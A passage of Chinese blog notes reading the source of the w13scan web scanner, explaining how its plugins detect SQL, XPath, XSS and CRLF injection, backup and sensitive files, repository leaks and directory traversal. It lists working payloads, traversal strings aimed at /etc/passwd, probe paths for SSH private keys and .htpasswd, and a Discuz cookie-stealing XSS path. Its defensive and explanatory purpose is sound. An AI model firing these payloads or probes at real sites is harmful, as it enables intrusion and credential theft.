<p>接着用正则去匹配不同数据库的错误信息。</p>
<hr>
<h3 id="sql注入-布尔盲注"><a href="#sql注入-布尔盲注" class="headerlink" title="sql注入(布尔盲注)"></a>sql注入(布尔盲注)</h3><p>布尔盲注利用前提:</p>
<p>页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。</p>
<p>发包:</p>
<ul>
<li>源request</li>
<li>true page的request(<code>AND 110=110</code>)</li>
<li>false page的request(<code>AND 110=109</code>)</li>
</ul>
<p>对返回的content处理(优化手段): </p>
<ul>
<li><code>removeDynamicContent()</code>,目的是减少无关的内容的干扰,比如广告什么的。</li>
<li><code>getFilteredPageContent()</code>，去掉html标签,提取页面文本,例如<code>&#39;&lt;html&gt;&lt;title&gt;foobar&lt;/title&gt;&lt;body&gt;test&lt;/body&gt;&lt;/html&gt;&#39;</code>处理完会变成<code>foobar test</code></li>
</ul>
<p>判断漏洞:</p>
<p>以页面相似度作为依据,原始请求 ≈ 预期为真请求 ≠ 预期与假请求</p>
<blockquote>
<p>有空还需要再认真看一下这部分的代码</p>
</blockquote>
<blockquote>
<p>原作者的说明:<br>首先访问一次网页，和原网页对比，若相似度小于0.98则动态去除网页中不同的部分。<br>访问一次False页面，得到False页面与原页面的相似度 <code>ratio_false</code><br>访问一次True页面，得到True页面与原页面的相似度 <code>ratio_true</code><br><code>ratio_true</code> &gt; 0.88 and <code>ratio_true</code> - <code>ratio_false</code> &gt; 0.05 and <code>ratio_false</code> &lt; 0.98 即可判断为sql注入<br>否则按照换行符分隔原始页面，True页面，False页面获得<code>originSet</code>,<code>trueSet</code>,<code>falseSet</code>集合。<br><code>originSet</code> 对 <code>trueSet</code>的差集小于2并且 <code>trueSet</code> !&#x3D; <code>falseSet</code> 并且 <code>trueSet</code> 对<code>falseSet</code>差集大于0 即可判断为注入。</p>
</blockquote>
<hr>
<h3 id="sql注入-基于时间"><a href="#sql注入-基于时间" class="headerlink" title="sql注入(基于时间)"></a>sql注入(基于时间)</h3><p>这部分内容我不太懂,直接copy原作者的描述好了。。。</p>
<p>基于时间的探测方式，会因为一些网络的波动，影响最后的判断结果。sqlmap的时间盲注会先发送30个请求来建立模型，但对扫描器来说，这样的效率太低了，所以就采用了awvs的时间盲注检测方法。</p>
<ul>
<li><p>延时长度</p>
<ul>
<li><p>awvs将延时分为了四种类型，0延时<code>ZeroDelay</code>,长延时<code>LongDelay</code>，非常长延时<code>VeryLongDelay</code>,中间延时<code>MidDelay</code>，顾名思义，每种类型延时的时间不一样。</p>
</li>
<li><p>这些时间延时类型的判断依据只靠两个参数<code>longDuration</code>,<code>shortDuration</code></p>
</li>
<li><p>这两个参数由下面算法计算</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> internal_ip:</span><br><span class="line">self.longDuration = <span class="number">6</span></span><br><span class="line">self.shortDuration = <span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self.longDuration = <span class="number">3</span></span><br><span class="line">self.shortDuration = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r1 = requests.get(self.url, headers=self.headers)</span><br><span class="line">time1 = r1.elapsed.total_seconds()</span><br><span class="line">r2 = requests.get(self.url, headers=self.headers) </span><br><span class="line">time2 = r2.elapsed.total_seconds()</span><br><span class="line"></span><br><span class="line">_<span class="built_in">min</span> = <span class="built_in">min</span>(time1, time2)</span><br><span class="line">_<span class="built_in">max</span> = <span class="built_in">max</span>(time1, time2)</span><br><span class="line"></span><br><span class="line">self.shortDuration = <span class="built_in">max</span>(self.shortDuration, _<span class="built_in">max</span>) + <span class="number">1</span></span><br><span class="line">self.longDuration = self.shortDuration * <span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到内外网不同判断的参数也不一样</p>
</li>
</ul>
</li>
<li><p>随机延时测试</p>
<ul>
<li>接下来就是随机选取一种延时的类型来判断是否达到了延时需要的时间。</li>
<li>awvs至少会进行8次这样的随机延时测试，测试成功即可判断存在注入</li>
<li>当然，误差的容错也是有的，可以直接看代码。这种方式虽然暴力了点但是似乎没有其他好的办法了。</li>
</ul>
</li>
</ul>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql_flag = [</span><br><span class="line">        &#x27;/**/aNd(sEleCt+slEEp(&#123;time&#125;)uNiOn+sElect+1)&#x27;,</span><br><span class="line">        &quot;&#x27;aNd(sEleCt+slEEp(&#123;time&#125;)uNiOn/**/sElect+1)=&#x27;&quot;,</span><br><span class="line">        &#x27;&quot;aNd(sEleCt+slEEp(&#123;time&#125;)uNiOn/**/sElect+1)=&quot;&#x27;,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>

<p>比较精妙之处在于多次发包，再判断。</p>
<p>此处缺一个图。</p>
<hr>
<h3 id="被动子域名搜索"><a href="#被动子域名搜索" class="headerlink" title="被动子域名搜索"></a>被动子域名搜索</h3><p>从返回包中搜集子域名</p>
<p>正则匹配</p>
<hr>
<h3 id="xpath-注入"><a href="#xpath-注入" class="headerlink" title="xpath 注入"></a>xpath 注入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;&#x27;\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;!--&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>篡改发包:</p>
<ul>
<li>遍历参数,在参数值后面加上payload即可</li>
<li>在response包用2种规则匹配。</li>
</ul>
<p>两种判断规则:</p>
<ul>
<li><p>字符串特征:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plainArray = [</span><br><span class="line">    <span class="string">&#x27;MS.Internal.Xml.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Unknown error in XPath&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;org.apache.xpath.XPath&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A closing bracket expected in&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;An operand in Union Expression does not produce a node-set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cannot convert expression to a number&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Document Axis does not allow any context Location Steps&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Empty Path Expression&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Empty Relative Location Path&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Empty Union Expression&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Expected node test or name specification after axis operator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Incompatible XPath key&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Incorrect Variable Binding&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;libxml2 library function failed&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A document must contain exactly one root element.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;font face=&quot;Arial&quot; size=2&gt;Expression must evaluate to a node-set.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Expected token \&#x27;\]\&#x27;&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>正则:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">regexArray = [</span><br><span class="line">    <span class="string">&quot;(Invalid (predicate|expression|type) in .*?\son line)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&lt;b&gt;\sException\sDetails:\s&lt;\/b&gt;System\.Xml\.XPath\.XPathException:\s&#x27;.*&#x27;\shas\san\sinvalid\stoken\.&lt;br&gt;&lt;br&gt;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&lt;b&gt;\sException\sDetails:\s&lt;\/b&gt;System\.Xml\.XPath\.XPathException:\sThis\sis\san\sunclosed\sstring\.&lt;br&gt;&lt;br&gt;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(System.Xml.XPath.XPathException\:)&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="xss注入"><a href="#xss注入" class="headerlink" title="xss注入"></a>xss注入</h3><p>暂只支持Get请求方式</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rndStr = <span class="number">9000</span> + random.randint(<span class="number">1</span>, <span class="number">999</span>)</span><br><span class="line">tag = random_str(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">html_payload = <span class="string">&quot;&lt;&#123;tag&#125;&gt;&#123;randint&#125;&lt;/&#123;tag&#125;&gt;&quot;</span>.<span class="built_in">format</span>(tag=tag, randint=rndStr)  <span class="comment"># html xss</span></span><br><span class="line"></span><br><span class="line">attr_payload = [</span><br><span class="line">    <span class="string">&#x27;&quot; oNsOmeEvent=&quot;console.log(233)&#x27;</span>,  <span class="comment"># 双引号payload</span></span><br><span class="line">    <span class="string">&quot;&#x27; oNsOmeEvent=&#x27;console.log(2333)&quot;</span>,  <span class="comment"># 单引号payload</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">url_payload = <span class="string">&quot;javascript&amp;colon;&#123;randint&#125;&quot;</span>.<span class="built_in">format</span>(randint=rndStr)</span><br><span class="line"></span><br><span class="line">javascript_payload = <span class="string">&quot;&#123;randint&#125;&quot;</span>.<span class="built_in">format</span>(randint=rndStr)</span><br></pre></td></tr></table></figure>

<p>判断是否输出点是否在<code>&lt;script&gt;</code>标签内,</p>
<p>如果是就使用<code>javascript_payload</code></p>
<p>如果不是就测试<code>html xss</code>、<code>标签属性xss</code>、<code>url xss</code></p>
<blockquote>
<p>需要补充…</p>
</blockquote>
<hr>
<h3 id="crlf注入"><a href="#crlf注入" class="headerlink" title="crlf注入"></a>crlf注入</h3><p>暂只支持Get请求方式</p>
<p>payloads:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;\r\nTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\r\n\tTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\r\n TestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\r\tTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\nTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\rTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="comment"># twitter crlf</span></span><br><span class="line">    <span class="string">&quot;嘊嘍TestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="comment"># nodejs crlf</span></span><br><span class="line">    <span class="string">&quot;čĊTestInject: w13scan&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>发包:</p>
<hr>
<h3 id="cookie控制插件"><a href="#cookie控制插件" class="headerlink" title="cookie控制插件"></a>cookie控制插件</h3><hr>
<h3 id="js漏洞库查找"><a href="#js漏洞库查找" class="headerlink" title="js漏洞库查找"></a>js漏洞库查找</h3><p>检测到当前页面存在过时的含有漏洞的js组件</p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://www.anquanke.com/post/id/86641">【技术分享】如何攻击Java反序列化过程</a></li>
<li><a href="http://www.polaris-lab.com/index.php/archives/178/">Python Pickle的任意代码执行漏洞实践和Payload构造</a></li>
<li><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1-%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%EF%BC%9A">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></li>
<li><a href="https://www.jianshu.com/p/aef2ae0498df">SSTI模板注入</a></li>
<li><a href="https://x.hacking8.com/post-356.html">写在w13scan第一阶段</a></li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>w13scan-扫描插件总结-PerFolder</title>
    <url>//7544.html</url>
    <content><![CDATA[<h1 id="整体流程图"><a href="#整体流程图" class="headerlink" title="整体流程图"></a>整体流程图</h1><p><img src="https://i.loli.net/2019/12/17/b27hPyBAzm3vN5g.png" alt="W13SCAN-DESIGN.jpg"></p>
<hr>
<h2 id="PerFolder-每个目录"><a href="#PerFolder-每个目录" class="headerlink" title="PerFolder (每个目录)"></a>PerFolder (每个目录)</h2><p>比如有一个url为:<code>http://xxxxxxxx/imcloud/static/seat/build/images/pic.jpg</code></p>
<p>拆解后的目录为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.125.20.39/</span><br><span class="line">http://10.125.20.39/imcloud/</span><br><span class="line">http://10.125.20.39/imcloud/static/</span><br><span class="line">http://10.125.20.39/imcloud/static/seat/</span><br><span class="line">http://10.125.20.39/imcloud/static/seat/build/</span><br><span class="line">http://10.125.20.39/imcloud/static/seat/build/images/</span><br></pre></td></tr></table></figure>

<p>然后以这些目录url为基础,拼接url去扫描</p>
<hr>
<h3 id="备份文件扫描"><a href="#备份文件扫描" class="headerlink" title="备份文件扫描:"></a>备份文件扫描:</h3><p>原理:</p>
<p>获取来自服务器的原始套接字响应即通过文件头来识别。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw</span><br><span class="line">&lt;requests.packages.urllib3.response.HTTPResponse <span class="built_in">object</span> at <span class="number">0x101194810</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw.read(<span class="number">10</span>)</span><br><span class="line"><span class="string">&#x27;\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上网找了一个rar,试了一下输出的文件头是<code>b&#39;PK\x03\x04\x14\x00\x00\x00\x08\x00&#39;</code></p>
<p>插件里的注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* rar:526172211a0700cf9073</span><br><span class="line">* zip:504b0304140000000800</span><br><span class="line">* gz：1f8b080000000000000b</span><br><span class="line">* tar.gz: 1f8b0800</span><br></pre></td></tr></table></figure>

<p>不同后缀的文件有不同的文件头特征.</p>
<p>有一份简单的备份文件的字典列表,<code>&#39;bak.rar&#39;, &#39;bak.zip&#39;, &#39;backup.rar&#39;, &#39;backup.zip&#39;, &#39;www.zip&#39;, &#39;www.rar&#39;, &#39;web.rar&#39;, &#39;web.zip&#39;,                     &#39;wwwroot.rar&#39;,                     &#39;wwwroot.zip&#39;, &#39;log.zip&#39;, &#39;log.rar&#39;</code></p>
<blockquote>
<p>字典这玩意可大可小</p>
</blockquote>
<p>通过拼接url,如果<code>status_code</code>是200而且文件头符合,则判断为扫出了备份文件。</p>
<hr>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历:"></a>目录遍历:</h3><p><img src="https://i.loli.net/2019/12/18/v1jFySAURNh76Cm.jpg"></p>
<p>找出一些常见的目录遍历的页面,html源码中有这些特征</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;directory listing for&quot;</span><br><span class="line"></span><br><span class="line">&quot;&lt;title&gt;directory&quot;</span><br><span class="line"></span><br><span class="line">&quot;&lt;head&gt;&lt;title&gt;index of&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&lt;table summary=&quot;directory listing&quot;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;last modified&lt;/a&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>如果在返回包的源码中发现这些特征,则判断这个页面有目录遍历漏洞。</p>
<hr>
<h3 id="敏感文件扫描"><a href="#敏感文件扫描" class="headerlink" title="敏感文件扫描:"></a>敏感文件扫描:</h3><p>敏感文件字典采集于bbscan</p>
<p>总的敏感文件有以下这些</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/config.inc</span><br><span class="line">/config.php.bak</span><br><span class="line">/db.php.bak</span><br><span class="line">/conf/config.ini</span><br><span class="line">/config.ini</span><br><span class="line">/config/config.ini</span><br><span class="line">/configuration.ini</span><br><span class="line">/configs/application.ini</span><br><span class="line">/settings.ini</span><br><span class="line">/application.ini</span><br><span class="line">/conf.ini</span><br><span class="line">/app.ini</span><br><span class="line">/config.json</span><br><span class="line">/a.out</span><br><span class="line">/key</span><br><span class="line">/keys</span><br><span class="line">/key.txt</span><br><span class="line">/temp.txt</span><br><span class="line">/tmp.txt</span><br><span class="line">/php.ini</span><br><span class="line">/sftp-config.json</span><br><span class="line">/index.php.bak</span><br><span class="line">/.index.php.swp</span><br><span class="line">/index.cgi.bak</span><br><span class="line">/config.inc.php.bak</span><br><span class="line">/.config.inc.php.swp</span><br><span class="line">/config/.config.php.swp</span><br><span class="line">/.config.php.swp</span><br><span class="line">/.settings.php.swp</span><br><span class="line">/.database.php.swp</span><br><span class="line">/.db.php.swp</span><br><span class="line">/.mysql.php.swp</span><br><span class="line">/readme</span><br><span class="line">/README</span><br><span class="line">/readme.md</span><br><span class="line">/readme.html</span><br><span class="line">/changelog.txt</span><br><span class="line">/%e6%9b%b4%e6%96%b0%e6%97%a5%e5%bf%97.txt</span><br><span class="line">/www.log</span><br><span class="line">/error.log</span><br><span class="line">/log.log</span><br><span class="line">/sql.log</span><br><span class="line">/errors.log</span><br><span class="line">/db.log</span><br><span class="line">/data.log</span><br><span class="line">/app.log</span><br><span class="line">/ntunnel_mysql.php</span><br></pre></td></tr></table></figure>

<p>实际上的字典的格式为<code>&#123;&#39;path&#39;: &#39;/config.inc&#39;, &#39;tag&#39;: &#39;&#39;, &#39;content-type&#39;: &#39;&#39;, &#39;content-type_no&#39;: &#39;html&#39;&#125;</code></p>
<ul>
<li><code>tag</code>: html源码特征</li>
<li><code>content-type</code>: 文件拓展名</li>
<li><code>content-type_no</code>: 文件拓展名黑名单</li>
</ul>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li>符合html源码特征</li>
<li>符合文件拓展名</li>
<li>不在文件拓展名黑名单</li>
</ol>
<hr>
<h3 id="idea-工作目录解析"><a href="#idea-工作目录解析" class="headerlink" title=".idea 工作目录解析:"></a>.idea 工作目录解析:</h3><p>原理:</p>
<p>url拼接上<code>/.idea/workspace.xml</code></p>
<p>如果返回包源码中能正则匹配到<code>&lt;project version=&quot;\w+&quot;&gt;</code>，正则匹配版本号,则判定为 JetBrans .idea 泄漏.</p>
<hr>
<h3 id="phpinfo探测解析"><a href="#phpinfo探测解析" class="headerlink" title="phpinfo探测解析:"></a>phpinfo探测解析:</h3><p>字典为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;phpinfo.php&quot;,</span><br><span class="line">&quot;pi.php&quot;,</span><br><span class="line">&quot;php.php&quot;,</span><br><span class="line">&quot;i.php&quot;,</span><br><span class="line">&quot;test.php&quot;,</span><br><span class="line">&quot;temp.php&quot;,</span><br><span class="line">&quot;info.php&quot;,</span><br></pre></td></tr></table></figure>

<p>原理:</p>
<p>拼接Url,发包访问,如果返回包中含<code>&lt;title&gt;phpinfo()&lt;/title&gt;</code>, 则判定为存在phpinfo文件</p>
<hr>
<h3 id="git-svn-bzr-hg泄漏"><a href="#git-svn-bzr-hg泄漏" class="headerlink" title="git svn bzr hg泄漏:"></a>git svn bzr hg泄漏:</h3><p>字典为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = &#123;</span><br><span class="line">    <span class="string">&quot;/.svn/all-wcprops&quot;</span>: <span class="string">&quot;svn:wc:ra_dav:version-url&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/.git/config&quot;</span>: <span class="string">&#x27;repositoryformatversion[\s\S]*&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;/.bzr/README&quot;</span>: <span class="string">&#x27;This\sis\sa\sBazaar[\s\S]&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/CVS/Root&#x27;</span>: <span class="string">&#x27;:pserver:[\s\S]*?:[\s\S]*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/.hg/requires&#x27;</span>: <span class="string">&#x27;^revlogv1.*&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>键为文件路径,值为正则匹配规则。</p>
<p>拼接url, 正则匹配返回包内容,匹配成功则判定为目录下有仓库源码泄漏漏洞</p>
<hr>
<h3 id="Sftp探测"><a href="#Sftp探测" class="headerlink" title="Sftp探测:"></a>Sftp探测:</h3><p>字典:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sftp-config.json</span><br><span class="line">/recentservers.xml</span><br></pre></td></tr></table></figure>

<p>正则匹配</p>
<p><code>(&quot;type&quot;:[\s\S]*?&quot;host&quot;:[\s\S]*?&quot;user&quot;:[\s\S]*?</code></p>
<p><code>&quot;password&quot;:[\s\S]*&quot;)</code>,<code>(&lt;Pass&gt;[\s\S]*?&lt;\/Pass&gt;)</code></p>
<p>匹配到则认为找到sftp</p>
<hr>
<h3 id="WEB编辑器探测"><a href="#WEB编辑器探测" class="headerlink" title="WEB编辑器探测:"></a>WEB编辑器探测:</h3><p>规则格式和判定方式和敏感文件扫描一样。</p>
<p>规则格式:<code>&#123;&#39;path&#39;: &#39;/fckeditor/_samples/default.html&#39;, &#39;tag&#39;: &#39;&lt;title&gt;FCKeditor&#39;, &#39;content-type&#39;: &#39;html&#39;,                      &#39;content-type_no&#39;: &#39;&#39;&#125;</code></p>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li>符合html源码特征</li>
<li>符合文件拓展名</li>
<li>不在文件拓展名黑名单</li>
</ol>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://github.com/w-digital-scanner/w13scan/blob/master/README_CN.md">w13scan</a></li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>w13scan-扫描插件总结-PerScheme</title>
    <url>//59261.html</url>
    <content><![CDATA[<h1 id="整体流程图"><a href="#整体流程图" class="headerlink" title="整体流程图"></a>整体流程图</h1><p><img src="https://i.loli.net/2019/12/17/b27hPyBAzm3vN5g.png" alt="W13SCAN-DESIGN.jpg"></p>
<hr>
<h2 id="PerScheme-每个域名"><a href="#PerScheme-每个域名" class="headerlink" title="PerScheme (每个域名)"></a>PerScheme (每个域名)</h2><p>如有url:<code>www.baidu.com/aaa/a.php</code></p>
<p>取其中的域名<code>www.baidu.com</code>为基础</p>
<p>其实就是相当于web的根目录</p>
<hr>
<h3 id="基于域名备份文件"><a href="#基于域名备份文件" class="headerlink" title="基于域名备份文件:"></a>基于域名备份文件:</h3><p>原理:</p>
<p>以域名的信息作为构造备份文件url的基础.</p>
<p>例如url: <code>www.baidu.com</code></p>
<p>则会构造出以下url去发包:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com/www.rar</span><br><span class="line">www.baidu.com/www.zip</span><br><span class="line">www.baidu.com/baidu.rar</span><br><span class="line">www.baidu.com/baidu.zip</span><br><span class="line">www.baidu.com/com.rar</span><br><span class="line">www.baidu.com/com.zip</span><br></pre></td></tr></table></figure>

<p>判定方式为 文件头特征。</p>
<hr>
<h3 id="通用敏感文件扫描"><a href="#通用敏感文件扫描" class="headerlink" title="通用敏感文件扫描:"></a>通用敏感文件扫描:</h3><p>字典收集自BBScan的插件,如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/core</span><br><span class="line">/crossdomain.xml</span><br><span class="line">/debug.txt</span><br><span class="line">/.bash_history</span><br><span class="line">/.rediscli_history</span><br><span class="line">/.bashrc</span><br><span class="line">/.bash_profile</span><br><span class="line">/.bash_logout</span><br><span class="line">/.vimrc</span><br><span class="line">/.DS_Store</span><br><span class="line">/.history</span><br><span class="line">/.htaccess</span><br><span class="line">/htaccess.bak</span><br><span class="line">/.htpasswd</span><br><span class="line">/.htpasswd.bak</span><br><span class="line">/htpasswd.bak</span><br><span class="line">/nohup.out</span><br><span class="line">/.mysql_history</span><br><span class="line">/httpd.conf</span><br><span class="line">/web.config</span><br><span class="line">/server-status</span><br><span class="line">/solr/</span><br><span class="line">/examples/</span><br><span class="line">/examples/servlets/servlet/SessionExample</span><br><span class="line">/config/database.yml</span><br><span class="line">/database.yml</span><br><span class="line">/db.conf</span><br><span class="line">/db.ini</span><br><span class="line">/jmx-console/HtmlAdaptor</span><br><span class="line">/cacti/</span><br><span class="line">/zabbix/</span><br><span class="line">/jenkins/static/f3a41d2f/css/style.css</span><br><span class="line">/static/f3a41d2f/css/style.css</span><br><span class="line">/script</span><br><span class="line">/jenkins/script</span><br><span class="line">/exit</span><br><span class="line">/memadmin/index.php</span><br><span class="line">/phpmyadmin/index.php</span><br><span class="line">/phpMyAdmin/index.php</span><br><span class="line">/_phpmyadmin/index.php</span><br><span class="line">/pma/index.php</span><br><span class="line">/ganglia/</span><br><span class="line">/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/profile</span><br><span class="line">/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=index.jsp</span><br><span class="line">/resin-admin/</span><br><span class="line">/.ssh/known_hosts</span><br><span class="line">/.ssh/id_rsa</span><br><span class="line">/id_rsa</span><br><span class="line">/.ssh/id_rsa.pub</span><br><span class="line">/.ssh/id_dsa</span><br><span class="line">/id_dsa</span><br><span class="line">/.ssh/id_dsa.pub</span><br><span class="line">/.ssh/authorized_keys</span><br><span class="line">/data.txt</span><br><span class="line">/install.txt</span><br><span class="line">/INSTALL.TXT</span><br><span class="line">/upload.do</span><br><span class="line">/upload.jsp</span><br><span class="line">/upload.php</span><br><span class="line">/upfile.php</span><br><span class="line">/upload.html</span><br></pre></td></tr></table></figure>

<p>规则格式和判定方式和Perfolder里的敏感文件扫描一样。</p>
<p>规则格式:<code>&#123;&#39;path&#39;: &#39;/core&#39;, &#39;tag&#39;: &#39;ELF&#39;, &#39;content-type&#39;: &#39;&#39;, &#39;content-type_no&#39;: &#39;&#39;&#125;</code></p>
<ul>
<li><code>tag</code>: html源码特征</li>
<li><code>content-type</code>: 文件拓展名</li>
<li><code>content-type_no</code>: 文件拓展名黑名单</li>
</ul>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li>符合html源码特征</li>
<li>符合文件拓展名</li>
<li>不在文件拓展名黑名单</li>
</ol>
<hr>
<h3 id="目录穿越扫描"><a href="#目录穿越扫描" class="headerlink" title="目录穿越扫描:"></a>目录穿越扫描:</h3><p>字典收集自BBScan的插件,如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/proc/meminfo</span><br><span class="line">/etc/profile</span><br><span class="line">/file:///etc/passwd</span><br><span class="line">/../../../../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">/../../../../../../../../../../../../../etc/profile</span><br><span class="line"></span><br><span class="line">//././././././././././././././././././././././././../../../../../../../../etc/profile</span><br><span class="line"></span><br><span class="line">/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/profile</span><br><span class="line"></span><br><span class="line">/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/profile</span><br><span class="line"></span><br><span class="line">/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br><span class="line"></span><br><span class="line">/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd</span><br><span class="line"></span><br><span class="line">/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span><br><span class="line"></span><br><span class="line">/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd</span><br></pre></td></tr></table></figure>


<p>规则格式和判定方式和Perfolder里的敏感文件扫描一样。</p>
<p>规则格式:<code>&#123;&#39;path&#39;: &#39;/etc/passwd&#39;, &#39;tag&#39;: &#39;root:x:&#39;, &#39;content-type&#39;: &#39;&#39;, &#39;content-type_no&#39;: &#39;&#39;&#125;</code></p>
<ul>
<li><code>tag</code>: html源码特征</li>
<li><code>content-type</code>: 文件拓展名</li>
<li><code>content-type_no</code>: 文件拓展名黑名单</li>
</ul>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li>符合html源码特征</li>
<li>符合文件拓展名</li>
<li>不在文件拓展名黑名单</li>
</ol>
<hr>
<h3 id="dz-xss探测"><a href="#dz-xss探测" class="headerlink" title="dz xss探测:"></a>dz xss探测:</h3><p>路径:<code>static/image/common/flvplayer.swf?file=1.flv&amp;linkfromdisplay=true&amp;link=javascript:alert(document.cookie);</code></p>
<p>判定依据: 状态码200 且 源码含<code>CWS</code>这个字符串</p>
<p>路径:</p>
